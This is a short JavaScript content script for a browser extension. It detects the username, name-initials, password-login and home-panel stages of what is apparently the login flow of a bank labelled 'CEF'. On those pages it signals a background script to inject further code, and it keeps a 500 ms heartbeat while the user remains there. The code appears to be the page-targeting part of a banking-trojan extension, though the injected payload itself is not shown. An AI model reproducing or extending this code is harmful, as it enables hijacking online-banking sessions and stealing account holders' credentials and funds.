
var timePulseInterval = 500;
var pulseInterval;

var checkPage = function(){
	var isCaixaHome = ($(document).has('#usuario').length > 0) ? true : false;
	var isLettersName = ($(document).has('#iniciais').length > 0) ? true : false;
	var isPasswordLogin = ($(document).has('#apl_quadrodir').length > 0) ? true : false;
	var isHomePanel = ($(document).has('#carousel-home').length > 0) ? true : false;


	if(isCaixaHome){
		return 'caixaHome';
	}		
	
	if(isLettersName)
		return 'lettersName';
	
	if(isPasswordLogin)
		return 'passwordLogin';
	
	if(isHomePanel)
		return 'homePanel';

	return window.location.href;
};



var sendMessageToBackground = function(event, data){
	chrome.runtime.sendMessage({
		event : event,
		data : data
	});
};


var pageName = checkPage();
var data = {
	homeName : 'CEF',
	pageName : pageName
};

// Inject content script on this page
sendMessageToBackground('injectContentScript', data);

// Sending pulse from this page each 500ms
pulseInterval = setInterval(function(){
	// Checking if the page is the same injectContentScript page
	var newPageName = checkPage();
	
	// if is changed, then clear pulse connection interval
	if(newPageName !== pageName){
		clearInterval(pulseInterval);
		return;
	}

	// IF the page injectContentScript is the same current pageName
	// contniue pulsing
	sendMessageToBackground('pulseConnectionPage', data);
	
},timePulseInterval);
